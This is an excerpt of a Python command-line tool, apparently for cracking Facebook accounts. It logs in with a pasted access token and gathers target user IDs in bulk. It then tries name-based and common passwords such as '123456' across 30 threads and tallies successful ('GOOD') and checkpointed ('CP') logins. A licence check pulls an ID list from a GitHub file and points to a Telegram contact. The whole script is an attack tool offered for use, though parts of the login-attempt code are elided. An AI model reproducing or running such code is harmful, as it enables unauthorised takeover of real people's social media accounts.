...
def chk():
  ...
  try:
    httpCaht = requests.get("https://github.com/Biloboy1/ZUCK/blob/main/Id.txt").text
    if id in httpCaht:
      ...
      print("\x1b[91mSend id telegram @zamo404")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def login_lagi():
	banner()
	sky = '\033[1;97m LOGIN MENGGUNAKAN AKSES TOKEN'
	sky2 = mark(sky, style='green')
	sol().print(sky2, style='cyan')
	panda = input(x+'['+p+'f'+x+'] \033[1;97mToken : ')
	akun=open('.token.txt','w').write(panda)
	try:
		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
		tes3 = json.loads(tes.text)['id']
		sue = '\033[1;92m Login OK'
		...
		li = '\033[1;97m KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
...
def menu(my_name,my_id,my_birthday):
	...
	sol().print(fx)
	io = '\033[1;97m[1]= \033[1;97mCrack Multi Id \n\033[1;97m[2]= \033[1;97mCrack Crack Multi v2 Id\n\033[1;97m[3]= \033[1;97mCHEK GOOD/CP\n\033[1;97m[0]=\033[1;91m Log Out'
	oi = nel(io, style='cyan')
	cetak(nel(oi, title=''))
	jh = input(x+'['+p+'$'+x+'] \033[1;97mchoice : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:
		dump_massal()
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'+'+x+']\033[1;97mFIX ID NO EROR ALL ID KURDISH ')
	pil = input(x+'['+p+'f'+x+'] \033[1;97m PASTE ID : ')
	try:
...
def dump_massal():
	...
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'+'+x+'] \033[1;97m PASTE ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+p+'f'+x+']\033[1;97m ID : '))
	except ValueError:
	...
	yz = 0
	print(x+'['+h+'+'+x+'] FIX "ID" NO EROR ALL ID KURDISH')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+']\033[1;97m ID PASTE '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def setting():
	...
	teks = '[1]= \033[1;97mMethod Api Wifi [NOT FAST]\n[2]= \033[1;97mMethod Api Wifi v2 [FAST CLONE]\n[3]= \033[1;97mMethod Api Mobile [Very Slow]'
	tak = nel(teks, style='cyan')
	cetak(nel(tak, title='SETTING'))
	hu = input(x+'['+p+'+'+x+'] \033[1;97mchoice : ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
	...
	ioz = '\033[1;97m[1]= Method Api Wifi [Very-FAST] \n\033[1;97m[2]= Method Mobile [FAST]\n\033[1;97m[3]= Method Free Mod [Very-Slow]'
	gess = nel(ioz, style='cyan')
	cetak(nel(gess, title='METHOD'))
	hc = input(x+'['+p+'+'+x+'] \033[1;97mchoice : ')
	if hc in ['1','01']:
		method.append('api')
	elif hc in ['3','03']:
		method.append('free')
	...
	aplik = input(x+'['+p+'+'+x+']\033[1;97mLink Apk  ? (y/t) : ')
	if aplik in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'['+p+'+'+x+']\033[1;97mChek All (y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['11223344','12345678','123','123456789','123456','12','112233']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
	...
	woi = input(x+'['+p+'+'+x+']\033[1;97mCrack ? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s %s/%s ====> \033[1;92mGOOD:%s ====> \033[1;91mCP:%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					infoakun += (f"\033[1;97m[+] Name :          {nomer}\n\033[1;97m[+] Create Facebook      : {tahun}\n\033[1;97m[+] Active Apk   : {ttl}\n")
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s\033[1;97m===> %s/%s ==> \033[1;92mGOOD:%s ===> \033[1;91mCP:%s ===> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
